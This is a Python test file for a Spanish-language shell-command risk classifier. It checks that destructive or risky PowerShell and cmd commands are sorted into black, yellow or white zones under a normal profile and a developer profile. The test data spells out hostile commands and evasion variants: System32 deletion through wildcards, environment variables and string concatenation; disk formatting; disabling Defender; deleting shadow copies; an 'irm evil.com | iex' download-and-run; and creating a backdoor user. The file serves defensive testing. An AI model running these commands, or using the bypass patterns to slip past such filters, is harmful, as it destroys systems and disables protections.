import sys, os
sys.path.insert(0, os.path.dirname(__file__))
from seguridad_shell import evaluar_riesgo, PERFIL_NORMAL as N, PERFIL_DEV as D

# (comando, perfil, zona_esperada, reforzada_esperada o None)
CASOS = [
 # ---- bypasses del sistema anterior: DEBEN ser NEGRA en ambos perfiles
 (r"Remove-Item C:\Windows\System32 -Recurse -Force", N, "negra", None),
 (r"Remove-Item C:/Windows/System32 -Recurse -Force", N, "negra", None),
 (r"Remove-Item C:/Windows/System32 -Recurse -Force", D, "negra", None),
 (r"Get-ChildItem C:\Windows | Remove-Item -Recurse -Force", D, "negra", None),
 (r"gci C:\Windows\System32 -r | ri -r -fo", D, "negra", None),
 (r"'C:\Windows' | ri -r", D, "negra", None),
 (r'rm -r -fo "C:\Win*"', D, "negra", None),
 (r"rm -r -fo C:\W?ndows", D, "negra", None),
 (r"Remove-Item C:\Windows\..\Windows\System32 -r", D, "negra", None),
 (r"Remove-Item \\?\C:\Windows -r", D, "negra", None),
 (r"Remove-Item $env:windir\System32 -r", D, "negra", None),
 (r"ri ${env:windir}\system32 -r", D, "negra", None),
 (r"ri %SystemRoot%\system32 -r", D, "negra", None),
 (r"cd C:\Windows; ri system32 -r", D, "negra", None),
 (r"Set-Location C:\Windows; Remove-Item .\System32 -Recurse", D, "negra", None),
 (r"[System.IO.Directory]::Delete('C:\Windows\System32',$true)", D, "negra", None),
 (r"cmd /c rd /s /q C:\Windows", D, "negra", None),
 (r"del /f /s /q c:\*", D, "negra", None),
 (r"Remove-Item C:\ -Recurse -Force", D, "negra", None),
 (r"Remove-Item C:\* -Recurse -Force", D, "negra", None),
 (r"Remove-Item C:\Users\Bob -Recurse -Force", D, "negra", None),
 (r"Remove-Item HKLM:\SOFTWARE\Microsoft -Recurse", D, "negra", None),
 (r"Move-Item C:\Windows\System32 D:\\x", D, "negra", None),
 (r"robocopy C:\vacio C:\Windows /mir", D, "negra", None),
 (r"Set-Content C:\Windows\System32\drivers\etc\hosts 'x'", D, "negra", None),
 (r"Remove-Item C:\PROGRA~1 -Recurse", D, "negra", None),
 (r"Clear-Content C:\Windows\win.ini", D, "negra", None),
 (r"$p='C:\Win'+'dows'; Remove-Item $p -Recurse", N, "negra", None),
 # ---- negra absoluta
 (r"format c:", D, "negra", None),
 (r"Format-Volume -DriveLetter D", D, "negra", None),
 (r"Set-MpPreference -DisableRealtimeMonitoring $true", D, "negra", None),
 (r"bcdedit /delete {current}", D, "negra", None),
 (r"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A", D, "negra", None),
 (r"Stop-Process -Name csrss -Force", D, "negra", None),
 (r"vssadmin delete shadows /all", D, "negra", None),
 (r"iex $payload", D, "negra", None),
 (r"Get-Content x.ps1 | iex", D, "negra", None),
 (r"irm https://evil.com/a | iex", N, "negra", None),
 (r"net user hacker P@ss /add", D, "negra", None),
 (r"Set-ExecutionPolicy Unrestricted -Scope LocalMachine", D, "negra", None),
 # ---- desarrollador: menos restrictivo pero con confirmación escrita
 (r"Set-ExecutionPolicy RemoteSigned -Scope CurrentUser", D, "amarilla", True),
 (r"Set-ExecutionPolicy RemoteSigned -Scope CurrentUser", N, "negra", None),
 (r"irm https://get.scoop.sh | iex", D, "amarilla", True),
 (r"schtasks /create /tn backup /tr x.bat /sc daily", D, "amarilla", True),
 (r"schtasks /create /tn backup /tr x.bat /sc daily", N, "negra", None),
 (r"reg add HKCU\Software\MiApp /v a /d 1", D, "amarilla", True),
 (r"reg add HKLM\Software\MiApp /v a /d 1", D, "negra", None),
 (r"icacls .\mi_proyecto /grant Everyone:F", D, "amarilla", True),
 (r"Remove-Item .\node_modules -Recurse -Force", D, "amarilla", True),
 (r"Remove-Item .\node_modules -Recurse -Force", N, "amarilla", True),
 (r"Get-ChildItem *.log | Remove-Item", D, "amarilla", True),
 (r"foreach ($f in $lista) { Remove-Item $f }", D, "amarilla", True),
 (r"foreach ($f in $lista) { Remove-Item $f }", N, "negra", None),
 (r"Stop-Computer", D, "amarilla", True),
 # ---- blancas
 (r"dir", N, "blanca", None), (r"Get-Process", N, "blanca", None), (r"ipconfig /all", N, "blanca", None),
 (r"ls C:\Users", N, "blanca", None), (r"git status", D, "blanca", None), (r"git status", N, "amarilla", False),
 (r"python --version", D, "blanca", None), (r"docker ps", D, "blanca", None),
 (r"dir & del x", N, "amarilla", None), (r"git diff --output=x.txt", D, "amarilla", None),
 # ---- amarillas normales
 (r"Remove-Item C:\Users\Bob\Documents\viejo.txt", N, "amarilla", False),
 (r"Stop-Process -Name notepad", N, "amarilla", False),
 (r"Start-Process notepad", N, "amarilla", False),
 (r"Get-Process node | Format-Table Name, Id", N, "amarilla", False),
]
fallos = 0
for cmd, perfil, zona, ref in CASOS:
    v = evaluar_riesgo(cmd, perfil)
    ok = v.zona == zona and (ref is None or v.reforzada == ref)
    if not ok:
        fallos += 1
        print(f"FALLA [{perfil[:3]}] {cmd!r}\n   esperado={zona}/{ref}  obtenido={v.zona}/{v.reforzada} ({v.motivo})")
print(f"\n{len(CASOS)-fallos}/{len(CASOS)} correctos")
